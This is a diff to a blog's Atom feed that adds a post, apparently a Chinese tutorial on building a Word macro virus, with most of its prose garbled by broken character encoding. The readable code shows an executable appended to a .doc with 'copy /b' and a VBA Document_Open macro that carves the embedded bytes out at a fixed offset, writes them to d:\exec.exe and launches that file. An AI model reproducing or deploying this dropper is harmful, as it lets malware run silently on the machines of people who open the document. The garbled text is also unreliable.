@@ -4,7 +4,7 @@
   <subtitle><![CDATA[Walk steps step by step]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2015-01-06T09:34:30.643Z</updated>
+  <updated>2015-01-13T13:53:40.202Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -13,6 +13,35 @@
   </author>
   
   <generator uri="http://zespia.tw/hexo/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[�겡��ִ����������exe.]]></title>
+    <link href="http://yoursite.com/2015/01/13/%E5%AE%8F%E7%97%85%E6%AF%92%EF%BC%88exe%E6%89%A7%E8%A1%8C%EF%BC%89/"/>
+    <id>http://yoursite.com/2015/01/13/宏病毒（exe执行）/</id>
+    <published>2015-01-13T12:51:49.000Z</published>
+    <updated>2015-01-13T13:53:24.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="�겡�����">�겡�����</h2>
+<p>�겡����һ�ּĴ����ĵ���ģ���ĺ��еļ�����������һ�������������ĵ������еĺ��ͻᱻִ�У����Ǻ겡���ͻᱻ���ת�Ƶ��������ϣ���פ����Normalģ���ϡ�</p>
+<h2 id="�������̣�">�������̣�</h2>
+<p>�����õķ�����Ҫ�ǰ�PE�ļ��ӵ�doc�ļ����棬Ȼ��ͨ��API��������λ��PE�ļ�λ�ã������ͷų��������У�������ϸ˵����</p>
+<h1 id="һ����PE�ļ�Ƕ��doc�ļ���"><strong>һ����PE�ļ�Ƕ��doc�ļ���</strong></h1>
+<p>����ʵ�������򵥣���Ҫ�ӵ�exe�ŵ�������doc�ļ�ͬһ��Ŀ¼��.����doc����:<br>copy /b xxxx.doc + xxxxx.exe newdoc.doc<br>������ͼƬ��д�������Ƶġ�</p>
+<h1 id="�������������룬ʵ�鹦��"><strong>�������������룬ʵ�鹦��</strong></h1>
+<p>�������õ���office2013,���ȴ���doc�ļ������������ϵĿ������ߣ��������������ڣ����ο�<a href="http://jingyan.baidu.com/article/9f7e7ec05965d46f28155496.html��,
+Ȼ������Visual Basic,���ɴ��� Microsoft Visual Basic�༭������дVB���루office�����ĺ���������VBA��������
+������ǿ���£�����������doc�ļ�����ʱָ��exe�ļ�������д��VB������д��**Newtext(doc�ļ���" target="_blank" rel="external">�򿪿�������</a>**�����ģ������ǽ�������Normal�<br>���ȣ�<br>�������ǰѺ���������һЩ������������д����һ��ģ�����档<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214703.png" alt=""><br>1��createfile ���ڴ����ļ�,�ú���vb����������:<br>declare function createfile lib “kernel32” alias “createfilea” (byval lpfilename as string,<br>byval dwdesiredaccess as long, byval dwsharemode as long, byval lpsecurityattributes<br>as long, byval dwcreationdistribution as long, byval dwflagsandattributes as long, byval htemplate as long) as long<br>2)closehandle ���ڹرձ������ļ��ľ���,�ú���vb����������:<br>declare function closehandle lib “kernel32” (byval hobject as long) as long<br>3)readfile ���ڴӱ������ļ��ж�ȡ����,�ú���vb����������:<br>declare function readfile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestoread<br>as long, lpnumberofbytesread as long, byval lpoverlapped as long) as long<br>4)writefile ���ڰѶ�ȡ��������д���ļ�,�ú���vb����������:<br>declare function writefile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestowrite<br>as long, lpnumberofbyteswritten as long, byval lpoverlapped as long) as long<br>5)setfileponiter�ƶ��ļ�ָ��,�ú���vb����������:<br>declare function setfilepointer lib “kernel32” (byval hfile as long, byval ldistancetomove as long, byval<br>lpdistancetomovehigh as long, byval dwmovemethod as long) as long<br>6)���������Ϻ����Ĳ�������<br>public const generic_read as long = &amp;h80000000<br>public const generic_write as long = &amp;h40000000<br>public const file_share_read as long = 1<br>public const file_share_write as long = 2<br>public const create_new as long = 1<br>public const create_always as long = 2<br>public const open_existing as long = 3<br>public const open_always as long = 4<br>public const truncate_existing as long = 5<br>public const invalid_handle_value as long = -1<br>public const file_attribute_normal as long = &amp;h80</p>
+<p>���Σ�<br>���Ĵ��빦�ܣ����ǲ���������API��<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214607.jpg" alt=""><br>�������£�<br>‘’’c<br>Private Sub Document_Open()<br>Dim buffer(114688) As Byte<br>Dim h, h2, j, i, k As Long<br>h = CreateFile(ThisDocument.Path &amp; “/“ &amp; ThisDocument.Name, generic_read, file_share_read + file_share_write, 0, open_existing, 0, 0)<br>‘��share_read�ķ�ʽ����������doc�ļ�<br>h2 = CreateFile(“d:\exec.exe”, generic_write, 0, 0, create_always, 0, 0)<br>‘�½�һ��exe�ļ�׼�����Ŷ�ȡ����������.<br>If h = invalid_handle_value Then<br>Exit Sub<br>End If<br>k = SetFilePointer(h, 91136, nil, 0)<br>‘���ļ�ָ���ƶ���doc�ļ���exe�ļ����紦.<br>Do<br>i = ReadFile(h, buffer(0), 114688, j, 0)<br>i = WriteFile(h2, buffer(0), j, j, 0)<br>Loop Until j &lt; 114688<br>CloseHandle (h)<br>CloseHandle (h2)<br>Shell “cmd /c d:\exec.exe”<br>‘����exe�ļ�<br>End Sub<br>‘’’<br>�е�API���̾������˶��ܿ����ģ�����Ҫ��VB���죬�Ҷ�VBҲһ�ϲ�ͨ����Ȼ�����Ĵ����ܼ򵥣������ͷŵ�D�̣���ʵ�������ͷŵ���ʱĿ¼��Щ���ȵȡ�<br>�����ص�˵���£��������Ķ������֡�<br><strong><em>91136��ָ���Ѻ�����Ƕ���Ժ������ļ���С</em></strong><br><strong><em>114688������Ƕ��PE�ļ��Ĵ�С��</em></strong><br><strong><em>�����Ĳ����������ǣ��ȴ���doc�ļ���д�������룬������������Ҫ����д����������doc�ļ���С�Ͳ�֪���ˣ�����������������дһ�����֣��ڱ���һ�£��鿴doc�ļ���С���޸�һ�¼��ɣ���������CP��������PE�ļ���</em></strong></p>
+<h1 id="������ʾЧ��-"><strong>������ʾЧ��</strong>.</h1>
+<p>����doc�ļ�������ʾ�к����룬�����������Ϳ������С����Ժ겡�������кܶԱ׶ˡ�<br>����ͼ��ʾ��<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214627.jpg" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="�겡�����">�겡�����</h2>
+<p>�겡����һ�ּĴ����ĵ���ģ���ĺ��еļ�����������һ�������������ĵ������еĺ��ͻᱻִ�У����Ǻ겡���ͻᱻ���ת�Ƶ��������ϣ���פ����No]]>
+    </summary>
+    
+      <category term="��ȫ����" scheme="http://yoursite.com/categories/%EF%BF%BD%EF%BF%BDo%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[vim编辑器使用]]></title>
